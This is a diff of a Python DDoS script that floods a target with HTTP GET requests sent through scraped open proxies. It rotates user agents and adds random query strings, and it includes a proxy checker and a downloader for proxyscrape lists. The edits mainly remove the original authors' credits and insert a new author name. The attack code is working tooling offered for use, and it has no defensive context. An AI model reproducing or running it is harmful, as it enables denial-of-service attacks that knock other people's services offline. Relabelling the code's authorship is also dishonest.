@@ -1,12 +1,3 @@
-#Code By GogoZin
-#Can Be A Skid But Don't Be A Theif
-#-------------------------------#
-# Improved Script performance   #
-# Added Local Proxy Checker     #
-# Auto select file(for skid)    #
-#                 By L330n123   #
-#-------------------------------#
-
 import time
 import socket
 import random
@@ -38,14 +29,13 @@ MMMMMMMMMMMMMMMMMXxloxXMMMMMMMMMMMMMMMMM
 MMMMMMMMMMMMMMMMMWKkkKMMMMMMMMMMMMMMMMMM""")
 
 print("      Python Proxies Ddos Script")
-print("           Code By GogoZin") #Code By GogoZin
-print("      Improved By Leeon123 -2019/8/5")
+print("           Code By by fadi - random codes") 
 print("    Please Don't Attack Any Gov Site")
 
 userag =["Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"]
 acpt =["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n","Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",]
 
-def checking(lines): #Recoded from cc-attack By L330n123
+def checking(lines): 
 	global nums
 	global pprr
 	proxy = lines.strip().split(":")
@@ -59,7 +49,7 @@ def checking(lines): #Recoded from cc-attack By L330n123
 		pprr.remove(lines)
 	nums = nums + 1
 
-def check_proxy(): #Proxy Checker C0d3d By L330n123
+def check_proxy(): 
 	global nums
 	global pprr
 	nums = 0
@@ -109,15 +99,15 @@ def main():
 		times = int(70)
 	else:
 		times = int(times)
-	cho = str(input("Get Some Fresh Proxies ? (y/n) : "))                                                           #Code By GogoZin
+	cho = str(input("Get Some Fresh Proxies ? (y/n) : "))                                                        
 	if cho =='y':
 		if sl =='y':
-			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all') # Code By GogoZin
+			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all')
 			with open("proxies.txt","wb") as fp:
 				fp.write(rsp.content)
 				print("Sucess Get Https Proxies List !")
 		else:
-			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all') # Code By GogoZin
+			rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all') 
 			with open("proxies.txt","wb") as fp:
 				fp.write(rsp.content)
 				print("Sucess Get Http Proxies List !")
@@ -145,7 +135,7 @@ def main():
 def atk():
 	get_host = "GET " + str(urll) + "?="+ str(random.randint(1,65535)) +" HTTP/1.1\r\nHost: " + str(url)+ ":" + str(port) +"\r\n"
 	connection = "Connection: Keep-Alive\r\n"
-	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                               #Code By GogoZin
+	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                 
 	accept = random.choice(acpt)
 	rqs = get_host + useragent + accept + connection + "\r\n"
 	#pprr = open(list).readlines()
@@ -158,9 +148,9 @@ def atk():
 				s.connect((str(proxy[0]), int(proxy[1]))) 
 				s.send(str.encode(rqs))
 				try:
-					for i in range(times):                                                          #Code By GogoZin, Improved By L330n123
+					for i in range(times):                                                          
 						s.send(str.encode(rqs))
-					print("Sucess Sent Requests From ~ [ " + str(proxy[0])+":"+str(proxy[1]) + " ] ") # Code By GogoZin
+					print("Sucess Sent Requests From ~ [ " + str(proxy[0])+":"+str(proxy[1]) + " ] ")
 					s.close()
 				except:
 					s.close()
